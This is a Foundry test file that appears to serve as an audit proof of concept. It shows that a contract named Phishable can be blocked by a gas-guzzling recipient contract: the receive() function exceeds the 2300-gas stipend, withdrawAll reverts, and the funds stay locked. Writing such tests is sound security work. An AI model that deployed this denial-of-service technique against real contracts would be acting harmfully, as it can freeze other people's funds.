// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/phishable.sol";

contract GasGuzzler {
    uint256 public x;
    receive() external payable {
        // Perform expensive storage operation
        // Consumes >2300 gas causing transfer to fail
        for(uint i; i < 100; i++) {
            x = block.timestamp;
        }
    }
}

contract PhishableTest is Test {
    Phishable phishable;
    address owner = makeAddr("owner");
    address recipient = makeAddr("recipient");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.startPrank(owner, owner);
        phishable = new Phishable(owner);
        vm.stopPrank();

        // Fund contract with some ETH
        vm.deal(address(phishable), 5 ether);
    }

    function testWithdrawAllDenialOfService() public {
        GasGuzzler gasGuzzler = new GasGuzzler();

        console.log("--- BEFORE-Trigger ---");
        uint256 contractBalanceBefore = address(phishable).balance;
        uint256 totalWithdrawalsBefore = phishable.totalWithdrawals();
        console.log("Phishable contract balance:", contractBalanceBefore);
        console.log("Total Withdrawals:", totalWithdrawalsBefore);

        console.log("--- Trigger WithdrawAll ---");
        // Attempt withdrawal to gas-guzzling contract
        vm.prank(owner, owner);
        vm.expectRevert();
        phishable.withdrawAll(address(gasGuzzler));
        
        console.log("--- AFTER-Trigger ---");
        uint256 contractBalanceAfter = address(phishable).balance;
        uint256 totalWithdrawalsAfter = phishable.totalWithdrawals();
        console.log("Phishable contract balance:", contractBalanceAfter);
        console.log("Total Withdrawals:", totalWithdrawalsAfter);

        // Verify funds are still locked in contract
        assertEq(contractBalanceAfter, contractBalanceBefore, "Contract balance should remain unchanged");
        assertEq(totalWithdrawalsAfter, totalWithdrawalsBefore, "Total withdrawals should remain unchanged");

        // Compare before and after states
        if(contractBalanceAfter == contractBalanceBefore && totalWithdrawalsAfter == totalWithdrawalsBefore) {
            console.log("Vulnerability Exists: Withdrawal failure leaves funds locked in contract");
        } else {
            console.log("Vulnerability not Exist: State changed during withdrawal");
        }
    }
}